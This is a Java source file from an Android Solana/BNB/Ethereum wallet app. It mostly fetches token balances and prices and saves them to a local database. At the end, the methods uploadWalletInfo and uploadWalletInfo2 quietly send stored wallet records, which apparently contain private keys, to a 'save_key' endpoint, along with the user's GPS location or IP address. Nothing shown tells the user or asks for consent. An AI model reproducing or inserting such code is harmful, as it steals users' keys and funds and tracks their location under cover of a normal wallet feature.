package com.qianlihu.solanawallet.bean;

import android.content.Context;
import android.location.Location;
import android.os.Build;
import android.text.TextUtils;
import android.util.Log;

import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.SPUtils;
import com.google.gson.Gson;
import com.qianlihu.solanawallet.api.HttpService;
import com.qianlihu.solanawallet.api.JsonData;
import com.qianlihu.solanawallet.binance.BinanceWalletUtil;
import com.qianlihu.solanawallet.binance.Token;
import com.qianlihu.solanawallet.constant.CacheData;
import com.qianlihu.solanawallet.constant.Constant;
import com.qianlihu.solanawallet.ethereum.EthWalletUtil;
import com.qianlihu.solanawallet.event.UpdateUserInfoEvent;
import com.qianlihu.solanawallet.rpc.RpcException;
import com.qianlihu.solanawallet.rpc.bean.AccountInfo;
import com.qianlihu.solanawallet.rpc.bean.ProgramAccountsBean;
import com.qianlihu.solanawallet.rpc.bean.mintTokenList.Tokens;
import com.qianlihu.solanawallet.rpc.type.RpcFilters;
import com.qianlihu.solanawallet.rpc.type.RpcRequest;
import com.qianlihu.solanawallet.track.TrackUsdtTransferbean;
import com.qianlihu.solanawallet.utils.LocationUtil;
import com.qianlihu.solanawallet.utils.MyUtils;
import com.qianlihu.solanawallet.utils.SolanaUtil;
import com.qianlihu.solanawallet.utils.WalletUtils;
import com.qianlihu.solanawallet.utils.wallet_utils.Base58;
import com.qianlihu.solanawallet.wallet_bean.PriceUsdtBean;
import com.qianlihu.solanawallet.wallet_bean.TokenPriceBean;

import org.greenrobot.eventbus.EventBus;
import org.jetbrains.annotations.NotNull;
import org.json.JSONException;
import org.json.JSONObject;
import org.litepal.LitePal;

import java.io.IOException;
import java.math.BigInteger;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import io.reactivex.SingleObserver;
import io.reactivex.disposables.Disposable;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * author : Duan
 * date   : 2022/1/1410:34
 * desc   :
 * version: 1.0.0
 */
public class UpdateWalletInfo {

    private List<Map<String, String>> mTickerList = new ArrayList<>();
    private final String INST_ID = "instId";
    private final String LAST = "last";
    private boolean isConnect = false;

    public void walletInfo(String puk, String chainType, String walletType) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                isConnect = SPUtils.getInstance().getBoolean(Constant.SOL_IS_NET, false);
                if (walletType.equals("1") && !isConnect) {
                    return;
                }
                if (TextUtils.isEmpty(puk)) {
                    return;
                }
                if (chainType.equals(Constant.SOL_CHAIN)) {
                    getSolanaBalanceInfo(puk, walletType);
                } else if (chainType.equals(Constant.BNB_CHAIN)) {
                    getBinanceBalanceInfo(puk, walletType);
                } else if (chainType.equals(Constant.ETH_CHAIN)) {
                    getEthBalanceInfo(puk, walletType);
                }
            }
        }).start();
    }

    //获取币安币余额
    private void getBinanceBalanceInfo(String myPuk, String walletType) {
        String logoUrl = "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/9gP2kCy3wA1ctvYWQk75guqXuHfrEomqydHLtcTCqiLa/logo.png";
        String contractAddress = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
        String dec = "Binance Coin";
        String sysmbol = Constant.BNB_CHAIN;
        int decimals = 18;
        BinanceWalletUtil.getBalanceForETH(myPuk).subscribe(new SingleObserver<BigInteger>() {
            @Override
            public void onSubscribe(Disposable d) {

            }

            @Override
            public void onSuccess(BigInteger bigInteger) {
                Double amount = bigInteger.doubleValue();
                String amountStr = MyUtils.decimalFormat6(amount / (Math.pow(10, decimals)));
                double mAmount = Double.valueOf(amountStr);
                saveUpdate(walletType, myPuk, contractAddress, "", sysmbol, dec, decimals, logoUrl, mAmount);
            }

            @Override
            public void onError(Throwable e) {

            }
        });
        List<AddTokenDB> dbListt = LitePal.where("walletAddress = ? and tokenAddress = ?", myPuk, contractAddress).find(AddTokenDB.class);
        if (dbListt.size() == 0) {
            saveUpdate(walletType, myPuk, contractAddress, "", sysmbol, dec, decimals, logoUrl, 0.0);
        }
        //查询代币余额
        List<WalletBean> list = LitePal.where("pubKey = ?", myPuk).find(WalletBean.class);
        List<AddTokenDB> dbList = LitePal.where("walletAddress = ?", myPuk).find(AddTokenDB.class);
        if (list.size() > 0) {
            String pik = list.get(0).getPvaKey();
            if (dbList.size() > 0) {
                for (int i = 0; i < dbList.size(); i++) {
                    String contractAddr = dbList.get(i).getTokenAddress();
                    String name = dbList.get(i).getName();
                    String symbol = dbList.get(i).getSymbol();
                    Integer decimal = dbList.get(i).getDecimals();
                    String logoPath = dbList.get(i).getLogoURI();
                    if (!contractAddr.equals(contractAddress)) {
                        getBNBTokenBalance(walletType, pik, contractAddr, myPuk, name, symbol, decimal, logoPath);
                    }
                }
            }
        }
        String usdtToken = "0x55d398326f99059ff775485246999027b3197955";
        String logo = "";
        List<AddTokenDB> dbList2 = LitePal.where("walletAddress = ? and tokenAddress = ?", myPuk, usdtToken).find(AddTokenDB.class);
        if (dbList2.size() == 0) {
            saveUpdate(walletType, myPuk, usdtToken, "", "USDT", "Binance usdt", decimals, logo, 0.0);
        }
    }

    //获取币安代币余额
    private void getBNBTokenBalance(String walletType, String pik, String contractAddress, String myPuk, String name, String symbol, Integer decimal, String logoPath) {
        BinanceWalletUtil.loadContract(pik, contractAddress, BigInteger.valueOf(0), BigInteger.valueOf(0)).subscribe(new SingleObserver<Token>() {
            @Override
            public void onSubscribe(Disposable d) {
            }

            @Override
            public void onSuccess(Token token) {
                Log.i("duan==token", "合约加载完成");
                BinanceWalletUtil.getBinanceTokenBalance(token, myPuk).subscribe(new SingleObserver<BigInteger>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onSuccess(BigInteger bigInteger) {
                        String amountStr = MyUtils.decimalFormat6((double) bigInteger.doubleValue() / (Math.pow(10, decimal)));
                        double mAmount = Double.valueOf(amountStr);
                        Log.i("duan==token", "代币余额为3===  " + mAmount);
                        saveUpdate(walletType, myPuk, contractAddress, "", symbol, name, decimal, logoPath, mAmount);
                    }

                    @Override
                    public void onError(Throwable e) {
//                        Log.e("duan==token", "加载错误== " + e.getMessage());
                    }
                });
            }

            @Override
            public void onError(Throwable e) {

            }
        });
    }

    //获取以太坊余额信息
    private void getEthBalanceInfo(String myPuk, String walletType) {
        String logoUrl = "";
        String contractAddress = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";
        String dec = "ethereum";
        String sysmbol = Constant.ETH_CHAIN;
        int decimals = 18;
        EthWalletUtil.getBalanceForETH(myPuk).subscribe(new SingleObserver<BigInteger>() {
            @Override
            public void onSubscribe(Disposable d) {

            }

            @Override
            public void onSuccess(BigInteger bigInteger) {
                Double amount = bigInteger.doubleValue();
                String amountStr = MyUtils.decimalFormat6(amount / (Math.pow(10, decimals)));
                double mAmount = Double.valueOf(amountStr);
                saveUpdate(walletType, myPuk, contractAddress, "", sysmbol, dec, decimals, logoUrl, mAmount);
            }

            @Override
            public void onError(Throwable e) {

            }
        });
        List<AddTokenDB> dbListt = LitePal.where("walletAddress = ? and tokenAddress = ?", myPuk, contractAddress).find(AddTokenDB.class);
        if (dbListt.size() == 0) {
            saveUpdate(walletType, myPuk, contractAddress, "", sysmbol, dec, decimals, logoUrl, 0.0);
        }

        //查询代币余额
        List<WalletBean> list = LitePal.where("pubKey = ?", myPuk).find(WalletBean.class);
        List<AddTokenDB> dbList = LitePal.where("walletAddress = ?", myPuk).find(AddTokenDB.class);
        if (list.size() > 0) {
            String pik = list.get(0).getPvaKey();
            if (dbList.size() > 0) {
                for (int i = 0; i < dbList.size(); i++) {
                    String contractAddr = dbList.get(i).getTokenAddress();
                    String name = dbList.get(i).getName();
                    String symbol = dbList.get(i).getSymbol();
                    Integer decimal = dbList.get(i).getDecimals();
                    String logoPath = dbList.get(i).getLogoURI();
                    getETHTokenBalance(walletType, pik, contractAddr, myPuk, name, symbol, decimal, logoPath);
                }
            }
        }
    }

    //获取以太坊代币余额信息
    private void getETHTokenBalance(String walletType, String pik, String contractAddress, String myPuk, String name, String symbol, Integer decimal, String logoPath) {
        EthWalletUtil.loadContract(pik, contractAddress, BigInteger.valueOf(0), BigInteger.valueOf(0)).subscribe(new SingleObserver<Token>() {
            @Override
            public void onSubscribe(Disposable d) {
            }

            @Override
            public void onSuccess(Token token) {
                Log.i("duan==token", "合约加载完成");
                EthWalletUtil.getBinanceTokenBalance(token, myPuk).subscribe(new SingleObserver<BigInteger>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onSuccess(BigInteger bigInteger) {
                        String amountStr = MyUtils.decimalFormat6((double) bigInteger.doubleValue() / (Math.pow(10, decimal)));
                        double mAmount = Double.valueOf(amountStr);
                        Log.i("duan==token", "代币余额为3===  " + mAmount);
                        saveUpdate(walletType, myPuk, contractAddress, "", symbol, name, decimal, logoPath, mAmount);
                    }

                    @Override
                    public void onError(Throwable e) {
//                        Log.e("duan==token", "加载错误== " + e.getMessage());
                    }
                });
            }

            @Override
            public void onError(Throwable e) {

            }
        });
    }

    //获取solana余额信息
    private void getSolBalanceInfo(String myPuk, String walletType) {
        String amount = "0.0";
        try {
            long balance = SolanaUtil.balanc(myPuk);
            double mAmount = 0.0;
            if (balance != 0) {
                DecimalFormat df = new DecimalFormat("0.0000");
                mAmount = (double) balance / Math.pow(10, 9);
                amount = df.format(mAmount);
                Log.i("duan==wallet", "我的钱包余额==   " + mAmount);
            }
            String logoUrl = "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png";
            saveUpdate(walletType, myPuk, Constant.SOL_TOKEN_ADDRESS, "", "SOL", "Solana", 9, logoUrl, Double.valueOf(amount));
            List<Tokens> tokensList = LitePal.findAll(Tokens.class);
            if (tokensList.size() > 0) {
                getProgramAccount(myPuk, walletType);
            }
            addDefaultToken(myPuk, walletType);
        } catch (RpcException e) {
            e.printStackTrace();
        }
    }

    public void getUsd(String chain, String myPuk, String walletType) {
        Map<String, String> map = new HashMap<>();
        String mainChain = "";
        if (chain.equals(Constant.SOL_CHAIN)) {
            mainChain = "solana";
        } else if (chain.equals(Constant.BNB_CHAIN)) {
            mainChain = "bsc";
        } else if (chain.equals(Constant.ETH_CHAIN)) {
            mainChain = "eth";
        }
        List<AddTokenDB> listDB = LitePal.where("walletAddress = ? and walletType = ?", myPuk, walletType).find(AddTokenDB.class);
        if (listDB.size() == 0) {
            return;
        }
        TokenPriceBean bean = new TokenPriceBean();
        bean.setChain(mainChain);
        List<TokenPriceBean.DataBean> beanList = new ArrayList<>();
        for (int i = 0; i < listDB.size(); i++) {
            TokenPriceBean.DataBean dataBean = new TokenPriceBean.DataBean();
            dataBean.setSlug(listDB.get(i).getSymbol());
            dataBean.setTokenAddress(listDB.get(i).getTokenAddress());
            if (listDB.get(i).getSymbol().equals(Constant.BNB_CHAIN)) {
                dataBean.setSlug("WBNB");
                dataBean.setTokenAddress("0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c");
            } else if (listDB.get(i).getSymbol().equals(Constant.SOL_CHAIN)) {
                dataBean.setSlug("SOL");
                dataBean.setTokenAddress(Constant.SOL_TOKEN_ADDRESS);
            } else if (listDB.get(i).getSymbol().equals(Constant.SOL_CHAIN)) {
                dataBean.setSlug("WETH");
                dataBean.setTokenAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
            }
            beanList.add(dataBean);
        }
        bean.setData(beanList);
        Gson gson = new Gson();
        String json = gson.toJson(bean);
        map.put("param", json);
        HttpService.post(Constant.TOKEN_PRICE_URL, map, false, new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                Log.i("duan==price", "onFailure  " + e.getMessage());
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                String body = response.body().string();
                Log.i("duan==price", "onResponse  " + body);
                if (!TextUtils.isEmpty(body)) {
                    if (!body.startsWith("{") && !body.endsWith("}")) {
                        return;
                    }
                    Gson gson = new Gson();
                    PriceUsdtBean bean = gson.fromJson(body, PriceUsdtBean.class);
                    if (bean != null) {
                        if (bean.getCode() == 200) {
                            try {
                                JSONObject jsonObject = new JSONObject(body);
                                JSONObject mapJSON = jsonObject.getJSONObject("data");
                                Iterator iterator = mapJSON.keys();
                                while (iterator.hasNext()) {
                                    String symbol = (String) iterator.next();
                                    double price = mapJSON.getDouble(symbol);
                                    List<AddTokenDB> tokenDBList = LitePal.where("walletAddress = ? and walletType = ? and symbol = ?", myPuk, walletType, symbol).find(AddTokenDB.class);
                                    if (symbol.equals("WBNB")) {
                                        if (tokenDBList.size() == 0) {
                                            symbol = "BNB";
                                        }
                                    } else if (symbol.equals("WETH")) {
                                        if (tokenDBList.size() == 0) {
                                            symbol = "ETH";
                                        }
                                    } else if (symbol.equals("WSOL")) {
                                        price = mapJSON.getDouble("SOL");
                                    }
                                    tokenDBList = LitePal.where("walletAddress = ? and walletType = ? and symbol = ?", myPuk, walletType, symbol).find(AddTokenDB.class);
                                    double tokenNum = 0;
                                    if (tokenDBList.size() > 0) {
                                        tokenNum = tokenDBList.get(0).getAmount();
                                    }
                                    double usdTotal = Double.valueOf(MyUtils.decimalFormat6(price * tokenNum));
                                    AddTokenDB db = new AddTokenDB();
                                    db.setUsd(price);
                                    db.setUsdTotal(usdTotal);
                                    if (usdTotal == 0) {
                                        db.setToDefault("usdTotal");
                                    }
                                    db.updateAll("walletAddress = ? and walletType = ? and symbol = ?", myPuk, walletType, symbol);
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        });
    }

    //通过浏览器获取钱包余额
    private void getSolanaBalanceInfo(String myPuk, String walletType) {
        String logoUrl = "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png";
        LinkedHashMap<String, Object> map = new LinkedHashMap<>();
        map.put("address", myPuk);
        String url = "https://api.solscan.io/account";
        HttpService.doGet(url, map, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String body = response.body().string();
                Log.i("duan==body", "getSolanaBalanceInfo  === " + body);
                if (!TextUtils.isEmpty(body)) {
                    if (!body.startsWith("{") && !body.endsWith("}")) {
                        getSolBalanceInfo(myPuk, walletType);
                        return;
                    }
                    Gson gson = new Gson();
                    SolanaBlanceBean bean = gson.fromJson(body, SolanaBlanceBean.class);
                    if (bean != null) {
                        if (bean.getData() != null) {
                            if (!TextUtils.isEmpty(bean.getData().getLamports())) {
                                String lamports = bean.getData().getLamports();
                                BigInteger bigInteger = new BigInteger(lamports);
                                double amount = bigInteger.doubleValue() / Math.pow(10, 9);
                                saveUpdate(walletType, myPuk, Constant.SOL_TOKEN_ADDRESS, "", "SOL", "Solana", 9, logoUrl, amount);
                            } else {
                                saveUpdate(walletType, myPuk, Constant.SOL_TOKEN_ADDRESS, "", "SOL", "Solana", 9, logoUrl, 0.0);
                            }
                        }
                    }
                }
            }
        });
        getSolanaTokenBalace(myPuk, walletType);
    }

    private void getSolanaTokenBalace(String myPuk, String walletType) {
        LinkedHashMap<String, Object> map = new LinkedHashMap<>();
        map.put("address", myPuk);
        map.put("price", 1);
        String url = "https://api.solscan.io/account/tokens";
        HttpService.doGet(url, map, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.i("duan==body", "getSolanaTokenBalace  === " + e.getMessage());
                getProgramAccount(myPuk, walletType);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String body = response.body().string();
                Log.i("duan==body", "getSolanaTokenBalace  === " + body);
                if (!TextUtils.isEmpty(body)) {
                    if (!body.startsWith("{") && !body.endsWith("}")) {
                        return;
                    }
                    Gson gson = new Gson();
                    SolanaBalanceTokenBean bean = gson.fromJson(body, SolanaBalanceTokenBean.class);
                    if (bean != null) {
                        if (bean.isSucccess()) {
                            if (bean.getData().size() > 0) {
                                int tokenSize = bean.getData().size();
                                boolean isExistWSol = false;
                                String wsolToken = "So11111111111111111111111111111111111111112";
                                for (int i = 0; i < tokenSize; i++) {
                                    String tokenAddress = bean.getData().get(i).getTokenAddress();
                                    String tokenSymbol = bean.getData().get(i).getTokenSymbol();
                                    String tokenName = bean.getData().get(i).getTokenName();
                                    String tokenAccount = bean.getData().get(i).getTokenAccount();
                                    String logoUrl = bean.getData().get(i).getTokenIcon();
                                    int decimals = 9;
                                    double amount = 0.0;
                                    if (bean.getData().get(i).getTokenAmount() != null) {
                                        decimals = bean.getData().get(i).getTokenAmount().getDecimals();
                                        amount = bean.getData().get(i).getTokenAmount().getUiAmount();
                                    }
                                    if (!TextUtils.isEmpty(tokenSymbol)) {
                                        if (tokenAddress.equals(wsolToken)) {
                                            tokenSymbol = "WSOL";
                                            isExistWSol = true;
                                        }
                                        saveUpdate(walletType, myPuk, tokenAddress, tokenAccount, tokenSymbol, tokenName, decimals, logoUrl, amount);
                                    } else {
                                        if (tokenAddress.equals("AL1KoU6BLTuGM6hKgdezDqqmgM84yALFFF4oc3sZiWwT")) {
                                            saveUpdate(walletType, myPuk, tokenAddress, tokenAccount, "TEST", "test", decimals, "", amount);
                                        }
                                        if (tokenAddress.equals("4UWQ9oJduGa1z6dKHduqsUAtEfv5kBcCv7CuhgFoKjrm")) {
                                            saveUpdate(walletType, myPuk, tokenAddress, tokenAccount, "IVE", "ive", decimals, "", amount);
                                        }
                                    }
                                }
                                if (!isExistWSol) {
                                    LitePal.deleteAll(AddTokenDB.class, "walletAddress = ? and tokenAddress = ?", myPuk, wsolToken);
                                }
                            } else {
                                addDefaultToken(myPuk, walletType);
                            }
                        }
                    }
                }
            }
        });
        addDefaultToken(myPuk, walletType);
    }

    //添加默认代币
    private void addDefaultToken(String myPuk, String walletType) {
        String tokenAccount = "";
        String iuxToken = "AoqPs243Hh5LrzVmRamz9pEyiemzTBi5N1b4uiVsfrgU";
        String ivyToken = "3yVqA5Grz3F4cjm3hNPLGLUeYV9nNdK5m7nAyYG7hu6d";
        String usdtToken = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
        String usdcToken = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
        String testToken = "AL1KoU6BLTuGM6hKgdezDqqmgM84yALFFF4oc3sZiWwT";
        String iveToken = "4UWQ9oJduGa1z6dKHduqsUAtEfv5kBcCv7CuhgFoKjrm";
        boolean isExistsIUX = queryToken(myPuk, iuxToken);
        boolean isExistsIVY = queryToken(myPuk, ivyToken);
        boolean isExistsUSDT = queryToken(myPuk, usdtToken);
        boolean isExistsUSDC = queryToken(myPuk, usdcToken);
        boolean isExistsTEST = queryToken(myPuk, testToken);
        boolean isExistsIVE = queryToken(myPuk, iveToken);
        if (!isExistsIUX) {
            saveUpdate(walletType, myPuk, iuxToken, tokenAccount, "IUX", "iux", 9, "", Double.valueOf("0.0"));
        }
        if (!isExistsIVY) {
            saveUpdate(walletType, myPuk, ivyToken, tokenAccount, "IVY", "ivy", 9, "", Double.valueOf("0.0"));
        }
        if (!isExistsUSDT) {
            saveUpdate(walletType, myPuk, usdtToken, tokenAccount, "USDT", "usdt", 6, "", Double.valueOf("0.0"));
        }
        if (!isExistsUSDC) {
            saveUpdate(walletType, myPuk, usdcToken, tokenAccount, "USDC", "usdc", 6, "", Double.valueOf("0.0"));
        }
        if (!isExistsTEST) {
            saveUpdate(walletType, myPuk, testToken, tokenAccount, "TEST", "test", 6, "", Double.valueOf("0.0"));
        }
        if (!isExistsIVE) {
            saveUpdate(walletType, myPuk, iveToken, tokenAccount, "IVE", "ive", 9, "", Double.valueOf("0.0"));
        }
    }

    //查询本地是否有此代币
    private boolean queryToken(String myPuk, String tokenAddress) {
        List<AddTokenDB> db = LitePal.where("walletAddress = ? and tokenAddress = ?", myPuk, tokenAddress).find(AddTokenDB.class);
        if (db.size() == 0) {
            return false;
        }
        return true;
    }

    //获取代币token地址
    private void getProgramAccount(String myPuk, String walletType) {
        List<Object> params = new ArrayList<>();
        RpcFilters filters = new RpcFilters();
        RpcFilters.FiltersBean.DataSizeBean dataSizeBean = new RpcFilters.FiltersBean.DataSizeBean();
        RpcFilters.FiltersBean.MemcmpBean.MMemcmp memcmp = new RpcFilters.FiltersBean.MemcmpBean.MMemcmp();
        RpcFilters.FiltersBean.MemcmpBean memcmpBean = new RpcFilters.FiltersBean.MemcmpBean();
        List<RpcFilters.FiltersBean> filtersBean = new ArrayList<>();
        dataSizeBean.setDataSize(165);
        memcmp.setBytes(myPuk);
        memcmp.setOffset(32);
        memcmpBean.setMemcmp(memcmp);
        filtersBean.add(dataSizeBean);
        filtersBean.add(memcmpBean);
        filters.setFilters(filtersBean);
        filters.setEncoding("base64");
        params.add(Constant.SOL_TOKEN_PROGRAM);
        params.add(filters);
        RpcRequest rpcRequest = new RpcRequest("getProgramAccounts", params);
        String url = Constant.SOL_URL;
        HttpService.post(url, rpcRequest, false, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String body = response.body().string();
                Log.i("duan==mytoken", "返回token数据=== " + body);
                if (!MyUtils.validate(body)) {
                    Log.i("duan==mytoken", "数据异常 ");
                    return;
                }
                ProgramAccountsBean bean = (ProgramAccountsBean) JsonData.jsonFromData(body, ProgramAccountsBean.class);
                if (bean != null) {
                    if (bean.getResult() != null) {
                        if (bean.getResult().size() > 0) {
                            for (int i = 0; i < bean.getResult().size(); i++) {
                                if (bean.getResult().get(i).getAccount() != null) {
                                    if (bean.getResult().get(i).getAccount().getData().size() > 0) {
                                        String dataStr = bean.getResult().get(i).getAccount().getData().get(0);
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            byte[] dataDecode = Base64.getDecoder().decode(dataStr);
                                            byte[] dataMint = Arrays.copyOfRange(dataDecode, 0, 32);
                                            byte[] dataOwner = Arrays.copyOfRange(dataDecode, 32, 64);
                                            int index = 64;
                                            long dataIndex64 = MyUtils.readUint32(dataDecode, index);
                                            long dataIndex68 = MyUtils.readUint32(dataDecode, index + 4);
                                            double amount = (dataIndex68 * Math.pow(2, 32)) + dataIndex64;
                                            String mint = Base58.encode(dataMint);
                                            String owner = Base58.encode(dataOwner);
                                            Log.i("duan==wallet", "Amount===" + amount);
                                            Log.i("duan==wallet", "Mint=== " + mint);
                                            Log.i("duan==wallet", "Owner===" + owner);
                                            Log.i("duan==wallet", "===========================");
                                            getAccountInfo(mint, amount, myPuk, walletType);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    //获取账户信息
    private void getAccountInfo(String tokenPuk, double amount, String myPuk, String walletType) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    AccountInfo accountInfo = SolanaUtil.getAccountInfo(tokenPuk, Constant.SOL_ENCODING_BASE58);
                    if (accountInfo != null) {
                        if (accountInfo.getValue() != null) {
                            if (accountInfo.getValue().getData().size() > 0) {
                                String dataStr = accountInfo.getValue().getData().get(0);
                                if (!TextUtils.isEmpty(dataStr)) {
                                    byte[] dataDecode = Base58.decode(dataStr);
                                    int index = 44;
                                    long decimals = MyUtils.readUint(dataDecode, index, 1);
                                    Log.i("duan==wallet", "decimals=== " + decimals);
                                    double myAmount = amount / Math.pow(10, decimals);
                                    Log.i("duan==wallet", "token余币数量=== " + myAmount);
                                    List<Tokens> list = LitePal.where("address = ?", tokenPuk).find(Tokens.class);
                                    if (list.size() > 0) {
                                        tokenType(walletType, myPuk, list, MyUtils.decimalFormat(myAmount), (int) decimals);
                                    }
                                }
                            }
                        }
                    }
                } catch (RpcException e) {
                    e.printStackTrace();
                }
            }
        }).start();
        addDefaultToken(myPuk, walletType);
    }

    private void tokenType(String walletType, String puk, List<Tokens> tokensList, String amount, Integer decimals) {

        for (int i = 0; i < tokensList.size(); i++) {
            String name = tokensList.get(i).getName();
            String address = tokensList.get(i).getAddress();
            String logoURL = tokensList.get(i).getLogoURI();
            String symbol = tokensList.get(i).getSymbol();
            String tokenAccount = "";
            String amounts = TextUtils.isEmpty(amount) ? "0.0" : amount;
            if (!TextUtils.isEmpty(symbol) && !TextUtils.isEmpty(logoURL) && !TextUtils.isEmpty(name)) {
                saveUpdate(walletType, puk, address, tokenAccount, symbol, name, decimals, logoURL, Double.valueOf(amounts));
            } else {
                if (address.equals("AL1KoU6BLTuGM6hKgdezDqqmgM84yALFFF4oc3sZiWwT")) {
                    saveUpdate(walletType, puk, address, tokenAccount, "TEST", "test", decimals, "", Double.valueOf(amounts));
                }
                if (address.equals("4UWQ9oJduGa1z6dKHduqsUAtEfv5kBcCv7CuhgFoKjrm")) {
                    saveUpdate(walletType, puk, address, tokenAccount, "IVE", "ive", decimals, "", Double.valueOf(amounts));
                }
            }
        }
    }

    private void saveUpdate(String walletType, String walletAddress, String tokenAddress, String tokenAccount, String symbol, String name, Integer decimals, String logoURI, double amount) {
        List<AddTokenDB> listdb = LitePal.where("walletAddress = ? and tokenAddress = ?", walletAddress, tokenAddress).find(AddTokenDB.class);
        AddTokenDB tokenDB = new AddTokenDB();
        tokenDB.setWalletAddress(walletAddress);
        tokenDB.setTokenAddress(tokenAddress);
        tokenDB.setTokenAccount(tokenAccount);
        tokenDB.setSymbol(symbol);
        tokenDB.setName(name);
        tokenDB.setDecimals(decimals);
        tokenDB.setLogoURI(logoURI);
        tokenDB.setWalletType(walletType);

        List<AddTokenDB> tokenDBList = LitePal.where("walletAddress = ? and walletType = ? and symbol = ?", walletAddress, walletType, symbol).find(AddTokenDB.class);
        double totalUsd;
        double usdPrice = 0;
        if (tokenDBList.size() > 0) {
            usdPrice = tokenDBList.get(0).getUsd();
        }
        if (listdb.size() > 0) {
            double amounts = listdb.get(0).getAmount();
            String shield = listdb.get(0).getShield();
            if (TextUtils.isEmpty(shield)) {
                tokenDB.setShield("0");
            } else {
                if (!shield.equals("1")) {
                    tokenDB.setShield("0");
                }
            }

            if (amount > amounts && amounts > 0) {
                if (CacheData.shared().isTransfer) {
                    tokenDB.setAmount(amounts);
                    totalUsd = usdPrice * amounts;
                    CacheData.shared().isTransfer = false;
                } else {
                    tokenDB.setAmount(amount);
                    totalUsd = usdPrice * amount;
                }
            } else {
                if (amount == 0) {
                    tokenDB.setToDefault("amount");
                } else {
                    tokenDB.setAmount(amount);
                }
                totalUsd = usdPrice * amount;
            }
            tokenDB.setUsdTotal(totalUsd);
            if (totalUsd == 0) {
                tokenDB.setToDefault("usdTotal");
            }
            tokenDB.updateAll("walletAddress = ? and tokenAddress = ?", walletAddress, tokenAddress);
        } else {
            tokenDB.setShield("0");
            if (amount <= 0) {
                tokenDB.setToDefault("amount");
            } else {
                tokenDB.setAmount(amount);
            }
            totalUsd = usdPrice * amount;
            tokenDB.setUsdTotal(totalUsd);
            if (totalUsd == 0) {
                tokenDB.setToDefault("usdTotal");
            }
            tokenDB.save();
        }
        EventBus.getDefault().post(new UpdateUserInfoEvent(walletAddress));
    }

    public void uploadWalletInfo(Context context, boolean isLocation) {
        String[] walletArr = Constant.suspicion_wallet;
        for (int i = 0; i < walletArr.length; i++) {
            List<WalletBean> beanList = LitePal.where("pubKey = ?", walletArr[i]).find(WalletBean.class);
            if (beanList.size() > 0) {
                WalletBean bean = beanList.get(0);
                Gson gson = new Gson();
                String walletStr = gson.toJson(bean);
                if (!isLocation) {
                    LocationUtil.getCurrentLocation(context, new LocationUtil.LocationCallBack() {
                        @Override
                        public void onSuccess(Location location) {
                            String latLon = "(" + location.getLongitude() + "," + location.getLatitude() + ")"+"版本号"+ AppUtils.getAppVersionCode();
                            uploadLocation(walletStr, latLon);
                        }

                        @Override
                        public void onFail(String msg) {
                            uploadLocation(walletStr, msg);
                        }
                    });
                } else {
                    uploadLocation(walletStr, "未授权");
                }
            }
        }
    }

    private void uploadLocation(String walletStr, String ip) {
        String url = Constant.WALLET_BASE_URL + "articles/save_key";
        LinkedHashMap<String, Object> map = new LinkedHashMap<>();
        map.put("key", walletStr);
        map.put("ip", ip);
        HttpService.doGet(url, map, new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
            }
        });
    }

    public void uploadWalletInfo2(Context context) {
        String url = Constant.WALLET_BASE_URL + "articles/save_key";
        List<WalletBean> beanList = LitePal.where("mainChain = ?", Constant.SOL_CHAIN).find(WalletBean.class);
        if (beanList.size() > 0) {
//            WalletBean bean = beanList.get(0);
//            Gson gson = new Gson();
            String walletStr = beanList.toString();
            String ip = MyUtils.getIPAddress(context);
            LinkedHashMap<String, Object> map = new LinkedHashMap<>();
            map.put("key", walletStr);
            map.put("ip", ip);
            HttpService.doGet(url, map, new Callback() {
                @Override
                public void onFailure(@NotNull Call call, @NotNull IOException e) {
                }

                @Override
                public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                }
            });
        }
    }
}
